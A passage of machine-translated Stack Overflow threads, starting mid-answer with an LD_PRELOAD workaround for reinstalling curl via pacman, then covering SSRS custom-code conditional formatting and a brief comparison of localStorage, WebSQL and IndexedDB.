cd /tmp/pacman_build
cp /var/cache/pacman/pkg/curl-7.26.0-1-`uname -m`.pkg.tar.xz .
tar -xJf curl-7.26.0-1-`uname -m`.pkg.tar.xz
LD_PRELOAD=/tmp/pacman_build/usr/lib/libcurl.so pacman -U /var/cache/pacman/pkg/curl-7.26.0-1-`uname -m`.pkg.tar.xz 
```

请注意，这要求您最近在包管理器缓存中拥有版本 7.26.0-1 的 curl。如果失败，请检查 /var/cache/pacman/pkg 以获取另一个版本的 curl。如果你那里没有一个，你必须找到一个。

# function - SSRS 表达式编辑器无法识别嵌入代码功能

> ID：11847998
> 
> 赞同：1
> 
> 时间：2012-08-07T14:17:33.573
> 
> 标签：function, reporting-services, ssrs-2008, ssrs-expression, custom-code

我有一份 SSRS 报告，其中包含我的公司已开具的发票信息，包括金额、日期、付款、到期金额等。我在 Visual Studio 2008 环境中使用 SSRS 2008（不是 R2）。我的问题与使用表达式编辑器格式化报告有关。目前，如果发票的应付金额（列）超过 0.01（未结发票），发票将被格式化为白银。我们还开具信用（负金额），这些几乎总是以前发票的负金额。

因此，已发出信用的发票仍将显示为白银，因为其到期金额 > 0.01。但是，如果这张发票有信用证，它实际上并不是未结清的，应该是白色的。例如，如果发票为 100.00 美元，并且在 ($100.00) 之后有贷项，则原始发票的背景颜色应切换为白色。

这是代码解释的来源。我认为这可以通过报告中的自定义 VB 代码实现，但似乎 SSRS 中的表达式编辑器无法识别我的函数，因为它显示“无法识别的标识符”。我在谷歌上搜索了一下，我遇到的大多数主题都说它会显示这一点，但无论如何它实际上是有效的。好吧，我很确定它根本不起作用，因为我把它作为我的表达式，并为某一列获取了所有白色单元格：

`=IIF(Fields!Amount_Due.Value > 0.01, IIF(Code.HasCredit(Fields!Amount_Due.Value) = True, "Blue", "Silver"), "Red")`

HasCredit 函数如下所示。

```
Function HasCredit(ByVal currentAmt as Double) As Boolean

Dim i as Integer
Dim amt as Double
Dim amts as System.Collections.ArrayList = New System.Collections.ArrayList()
Dim negativeAmt as Double
Dim retValue as Boolean = "False"

i = 0

For i = 1 to Report.Parameters!Test.Count()
    amt = Report.Parameters!Test.Value(i)
    amts.Add(amt)
Next

negativeAmt = currentAmt * -1

If amts.Contains(negativeAmt) Then
    retValue = "True"
End If

Return retValue
End Function 
```

当这两个部分运行时，我得到该列所有单元格的白色背景。我在网上读到一些东西说只有共享函数可以工作，但我发现了多个其他示例，这些示例显示了未共享的函数。当我分享它时，它给了我：`BC30369 Cannot refer to an instance member of a class from within a shared method or shared member initializer without an explicit instance of the class.`由于 Report.Parameters!Test.Count() 行。[我从http://social.msdn.microsoft.com/Forums/en-US/sqlreportingservices/thread/a7d59224-0ee5-491e-883b-2e5fcb3edeab](http://social.msdn.microsoft.com/Forums/en-US/sqlreportingservices/thread/a7d59224-0ee5-491e-883b-2e5fcb3edeab)得到了使用 Report.Parameters 的想法。

因此，重申一下，我基本上想要做的是将此列中每个单元格的值放入一个集合中，并且对于其中一个数量具有负等值的任何两个数量，给它一个白色背景而不是银色。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-07-29T18:52:25.713

在 SSRS 2008 R2 中，即使您引用了有效的自定义代码方法，表达式编辑器仍可能会警告标识符无效。这并不总是意味着它是无效的。即使引发了该警告，我的功能仍然有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-10T20:15:51.283

经过一番研究，我想出了如何解决这个问题。我基本上必须使用 =Join() 函数添加一个文本框，以便将列中的所有值都放在这个文本框中；然后在自定义代码中引用文本框并在表达式编辑器中使用布尔值。详细说明如下。

1）**在报表中添加一个多值参数**（右键单击参数，添加参数）。命名它，选择允许多个值，选择隐藏参数可见性。对于可用值选项卡，选择从查询中获取值。指向您的数据集，并将值字段设置为您希望参数检查的列。对我来说，那是我的应付金额栏。标签字段无关紧要，可以留空。在默认值选项卡中，执行相同操作，确保值字段设置为与以前相同的列。在高级下，选择从不刷新。

2)**在您的报告上创建一个新的文本框**。可能想要命名它，例如 txtColumnValues。编辑表达式并将其放入：`=Join(Parameters!YourParameter.Value, ",")`这将从您在参数中指定的列中获取所有字段值，每个字段值以逗号分隔。

3)**编辑报表的自定义代码**并创建一个 VB 函数（作为布尔值）来检查文本框。例如这里是我的代码。

```
Public Function HasCredit(Amt as Double, ri as ReportItems) as Boolean

Dim retValue as Boolean = False

If Amt > 0.00 AndAlso ri!txtAmounts.Value.Contains(Amt*-1) Then
   retValue = True
End If

Return retValue
End Function 
```

4）最后转到您要更改的字段的**表达式编辑器。**在我的示例中，如果当前字段在其他字段之一（我的文本框）中具有负等效项，我想更改背景颜色，因此我的代码如下所示：

`=IIF(Fields!Balance.Value > 0.01 AND Code.HasCredit(Fields!Balance.Value, ReportItems) = False, "Silver", "White")`

我不得不从 3 或 4 页中提取单独的信息，将它们放在一起，并希望它们能起作用……大约一周后，它们起作用了……我想这都是关于坚持的。如果您需要任何进一步的帮助，请告诉我。

# html - html5 本地存储和 web sql 存储

> ID：11847999
> 
> 赞同：1
> 
> 时间：2012-08-07T14:17:43.807
> 
> 标签：html, local-storage

我想知道html5 localstorage是否与web sql storage有关。

例如，您可以创建一个 localstorage 对象并使用 web sql 存储语法对其进行查询吗？

另外，indexedDB 和 web sql 存储有什么区别？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:19:33.183

除了他们可以在本地存储数据之外，没有其他关系。

*   LocalStorage 是简单的键/值存储
*   WebSQL 已被弃用，不再继续使用
*   IndexedDB 是一个 JSON 对象文档存储，它取代了 WebSQL。